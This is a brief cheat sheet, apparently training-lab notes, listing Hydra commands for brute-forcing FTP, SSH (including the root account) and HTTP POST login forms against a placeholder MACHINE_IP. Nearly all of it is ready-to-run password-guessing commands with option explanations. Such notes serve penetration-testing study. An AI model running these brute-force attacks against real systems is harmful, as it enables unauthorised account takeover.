# Hydra Commands Summary

The Hydra command varies based on the service (protocol) being targeted. Here’s how to set it up for different cases:

## FTP Brute Force

Use the following command to brute force FTP:

```sh
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

This tries all passwords in `passlist.txt` for the FTP user `user`.

## SSH Brute Force

Command:

```sh
hydra -l <username> -P <path_to_passlist> MACHINE_IP -t 4 ssh
```

Options:
- `-l`: SSH username
- `-P`: Password list
- `-t`: Number of threads

Example:

```sh
hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh
```

## POST Web Form Brute Force

Command:

```sh
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<credentials>:<fail_response>"
```

Options:
- `-l`: Web form username
- `-P`: Password list
- `http-post-form`: Specifies POST form type
- `<path>`: Login URL
- `<credentials>`: Format as `username=^USER^&password=^PASS^`
- `<fail_response>`: Part of the failed login message

Example:

```sh
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

## General Notes

- `-V` provides verbose output for every attempt.
- Check the form type (GET or POST) in browser developer tools if needed.